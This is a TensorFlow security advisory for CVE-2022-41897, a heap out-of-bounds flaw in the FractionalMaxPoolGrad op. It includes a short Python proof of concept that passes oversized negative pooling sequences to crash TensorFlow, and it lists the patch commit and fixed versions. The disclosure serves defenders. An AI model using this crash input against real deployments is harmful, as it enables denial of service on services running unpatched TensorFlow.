<h2>TFSA-2022-159: <code>FractionalMaxPoolGrad</code> Heap OOB</h2>
<h3>CVE Number</h3>
<p>CVE-2022-41897</p>
<h3>Impact</h3>
<p>If <a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/fractional_max_pool_op.cc"><code>FractionMaxPoolGrad</code></a> is given outsize inputs <code>row_pooling_sequence</code> and <code>col_pooling_sequence</code>, TensorFlow will crash.</p>
<p><code>python
import tensorflow as tf
tf.raw_ops.FractionMaxPoolGrad(
    orig_input = [[[[1, 1, 1, 1, 1]]]],
    orig_output = [[[[1, 1, 1]]]],
    out_backprop = [[[[3], [3], [6]]]],
    row_pooling_sequence = [-0x4000000, 1, 1], 
    col_pooling_sequence = [-0x4000000, 1, 1], 
    overlapping = False
 )</code></p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/d71090c3e5ca325bdf4b02eb236cfb3ee823e927">d71090c3e5ca325bdf4b02eb236cfb3ee823e927</a>.</p>
<p>The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.</p>
